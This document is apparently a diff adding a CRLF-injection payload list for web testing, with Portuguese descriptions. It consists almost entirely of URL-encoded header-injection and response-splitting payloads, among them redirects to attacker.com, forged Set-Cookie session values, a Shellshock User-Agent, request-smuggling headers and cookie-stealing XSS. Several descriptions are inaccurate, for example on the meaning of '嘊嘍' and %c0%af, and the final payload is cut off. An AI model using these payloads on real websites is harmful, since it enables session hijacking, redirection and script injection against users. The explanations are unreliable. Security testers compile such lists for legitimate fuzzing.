@@ -1,0 +1,74 @@
+/Teste%0d%0aInject-Header: teste
+/%0d%0aLocation: http://www.attacker.com/
+/%0d%0aSet-Cookie: session=123456%0d%0aSet-Cookie: user=admin
+GET / HTTP/1.1%0d%0aHost: www.example.com%0d%0aUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36%0d%0aCookie: session=123456%0d%0aInject-Header: teste%0d%0a%0d%0a
+%0D%0A
+%0D%0a
+%0d%0A
+%0d%0a
+%0D%0a%09
+%0d%0a%09
+%0d%0a%20
+%0d%0a%0d%0a
+%0d%0a%0d%0a%09
+%0d%0a%0d%0a%20
+
+
+%E5%98%8A%E5%98%8D - Esse payload é uma representação URL-encoded dos caracteres chineses "嘊嘍", que se traduzem como um retorno de carro e uma nova linha.
+
+%0d%0a%0d%0a%20%09 - Este payload inclui dois retornos de carro e nova linha seguidos de um caractere de espaço e um caractere de tabulação.
+
+%0d%0aTransfer-Encoding:%20chunked%0d%0a - Este payload explora a vulnerabilidade de CRLF para manipular o cabeçalho "Transfer-Encoding" e enviar uma solicitação HTTP com tamanho indefinido.
+
+%0d%0aContent-Length: 0%0d%0a%0d%0a - Este payload envia um cabeçalho HTTP Content-Length com um valor de zero, o que pode enganar o servidor para aceitar uma solicitação vazia.
+
+%0d%0aLocation: http://www.exemplo.com%0d%0a%0d%0a - Este payload injeta um cabeçalho HTTP Location com uma URL maliciosa, que pode ser usada para redirecionar o usuário para um site malicioso.
+
+%0d%0aSet-Cookie: PHPSESSID=ABCDEF01234567890%0d%0a%0d%0a - Este payload injeta um cabeçalho HTTP Set-Cookie com um valor malicioso para a sessão do usuário.
+
+%0d%0aHost: www.attacker.com%0d%0a - Este payload injeta um cabeçalho HTTP Host para direcionar a solicitação para um servidor controlado pelo atacante.
+
+%0d%0aUser-Agent:%20() { :;}; echo vulnerable%0d%0a - Este payload explora a vulnerabilidade de Shellshock para injetar um comando malicioso em um cabeçalho HTTP User-Agent.
+
+%0d%0aReferer:%20http://www.attacker.com/%0d%0a - Este payload injeta um cabeçalho HTTP Referer com um valor malicioso para enganar o servidor e pensar que a solicitação veio de outro site.
+
+%0d%0aAccept-Language:%20en-US,en;q=0.5%0d%0a - Este payload injeta um cabeçalho HTTP Accept-Language com um valor malicioso para enganar o servidor a pensar que o usuário está solicitando conteúdo em outro idioma.
+
+%E2%80%AE%E2%80%8E - Este payload é uma representação URL-encoded de um caractere RTL (Right-to-Left), que pode ser usado para manipular o texto em idiomas que usam esse tipo de escrita.
+
+%c0%af - Este payload é uma representação URL-encoded de um caractere Unicode que é uma combinação de um caractere nulo e uma barra (//), que pode ser usado para acessar diretórios e arquivos ocultos.
+
+%0d%0aIf-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT%0d%0a - Este payload injeta um cabeçalho HTTP If-Modified-Since com uma data de referência antiga, o que pode levar o servidor a não verificar o conteúdo atualizado.
+
+%0d%0aIf-None-Match: *%0d%0a - Este payload injeta um cabeçalho HTTP If-None-Match com um valor de asterisco, o que pode levar o servidor a não verificar a tag de entidade e retornar o conteúdo antigo.
+
+%0d%0aAccept-Encoding:%20gzip,%20deflate,%20br,%20malware%0d%0a - Este payload injeta um cabeçalho HTTP Accept-Encoding com um valor malicioso, que pode ser usado para tentar enganar o servidor a executar um malware.
+
+%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a - Este payload injeta um cabeçalho HTTP X-Forwarded-For com um valor malicioso, que pode ser usado para enganar o servidor a pensar que a solicitação veio de um endereço IP diferente.
+
+%0d%0aX-Forwarded-Host:%20www.attacker.com%0d%0a - Este payload injeta um cabeçalho HTTP X-Forwarded-Host com um valor malicioso, que pode ser usado para enganar o servidor a pensar que a solicitação veio de outro site.
+
+%0d%0aX-Forwarded-Server:%20www.attacker.com%0d%0a - Este payload injeta um cabeçalho HTTP X-Forwarded-Server com um valor malicioso, que pode ser usado para enganar o servidor a pensar que a solicitação veio de outro servidor.
+
+%0d%0aCookie:%20PHPSESSID=ABCDEF01234567890;%20secret=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E;%20language=en;%0d%0a - Este payload injeta um cabeçalho HTTP Cookie com valores maliciosos, que podem ser usados para executar um ataque de XSS (Cross-Site Scripting).
+
+%0d%0aAuthorization:%20Bearer
+%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKx
+
+%2f%0d%0a%09Set-Cookie:session=foo%0d%0a%09%0d%0a%20HTTP/1.1%20200%20OK%0d%0a%20Content-Type:text/html%0d%0a%20Content-Length:%200%0d%0a%0d%0a
+
+%0d%0aLocation:%20javascript:alert(document.cookie)%0d%0a%0d%0a
+/%0d%0aSet-Cookie:session_id=123456; Path=/; HttpOnly%0d%0a%0d%0a
+
+%0d%0aContent-Type:text/html%0d%0aContent-Length:%200%0d%0aSet-Cookie:session_id=123456; Path=/; HttpOnly%0d%0a%0d%0a
+
+%0d%0aTransfer-Encoding:chunked%0d%0aContent-Length:2%0d%0a%0d%0a1%0d%0aA%0d%0a%0d%0a
+
+%0d%0a%0d%0a%3cscript%3ealert(document.cookie)%3c/script%3e
+
+POST /login HTTP/1.1%0D%0AUser-Agent:Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/58.0.3029.110%20Safari/537.3%0D%0AContent-Type:application/x-www-form-urlencoded%0D%0AContent-Length:26%0D%0A%0D%0Ausername=admin&password=admin%0D%0A%0D%0ASet-Cookie:session=foo%0D%0A%0D%0A
+
+GET /secure_page HTTP/1.1%0D%0AHost:example.com%0D%0AReferer:%20https://example.com/%0D%0AAuthorization:%20Basic%20c2VydmljZTptYW4xc2VjcmV0%0D%0A%0D%0A
+%0d%0aRefresh:0;url=javascript:alert(document.cookie)%0d%0a%0d%0a
+
+POST /login HTTP/1.1%0D%0AHost:example.com%0D%0AUser-Agent:Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/58.0.3029.110%20Safari/537.3%0D%0AContent-Type:application/x-www-form-urlencoded%0D%0AContent-Length:28%0D%0A%0D%0Ausername=admin&password=admin%0D%0A%0D%0ASet-Cookie:session=foo%0D%0A%0D%0
